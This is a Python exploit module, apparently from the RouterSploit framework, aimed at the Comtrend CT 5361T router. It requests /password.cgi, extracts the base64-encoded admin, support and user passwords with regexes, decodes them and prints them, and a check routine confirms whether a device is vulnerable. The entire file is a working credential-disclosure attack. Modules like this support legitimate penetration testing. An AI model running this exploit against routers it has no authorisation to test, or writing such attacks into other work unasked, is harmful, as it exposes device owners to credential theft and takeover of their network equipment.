import re
from base64 import b64decode
from routersploit.core.exploit import *
from routersploit.core.http.http_client import HTTPClient


class Exploit(HTTPClient):
    __info__ = {
        "name": "Comtrend CT 5361T Password Disclosure",
        "description": "WiFi router Comtrend CT 5361T suffers from a Password Disclosure Vulnerability",
        "authors": (
            "TUNISIAN CYBER",  # routersploit module
        ),
        "references": (
            "https://packetstormsecurity.com/files/126129/Comtrend-CT-5361T-Password-Disclosure.html",
        ),
        "devices": (
            "Comtrend CT 5361T (more likely CT 536X)",
        )
    }

    target = OptIP("", "Target IPv4 or IPv6 address")
    port = OptPort(80, "Target HTTP port")

    def run(self):
        if self.check():
            response = self.http_request(
                method="GET",
                path="/password.cgi",
            )
            if response is None:
                return

            regexps = [
                ("admin", "pwdAdmin = '(.+?)'"),
                ("support", "pwdSupport = '(.+?)'"),
                ("user", "pwdUser = '(.+?)'")
            ]

            creds = []
            for regexp in regexps:
                res = re.findall(regexp[1], response.text)

                if res:
                    value = str(b64decode(res[0]), "utf-8")
                    creds.append((regexp[0], value))

            if len(creds):
                print_success("Credentials found!")
                headers = ("Login", "Password")
                print_table(headers, *creds)
                print_info("NOTE: Admin is commonly implemented as root")
            else:
                print_error("Credentials could not be found")
        else:
            print_error("Device seems to be not vulnerable")

    @mute
    def check(self):
        response = self.http_request(
            method="GET",
            path="/password.cgi",
        )

        if response is None:
            return False  # target is not vulnerable

        regexps = ["pwdAdmin = '(.+?)'",
                   "pwdSupport = '(.+?)'",
                   "pwdUser = '(.+?)'"]

        for regexp in regexps:
            res = re.findall(regexp, response.text)

            if len(res):
                try:
                    b64decode(res[0])  # checking if data is base64 encoded
                except Exception:
                    return False  # target is not vulnerable
            else:
                return False  # target is not vulnerable

        return True  # target is vulnerable
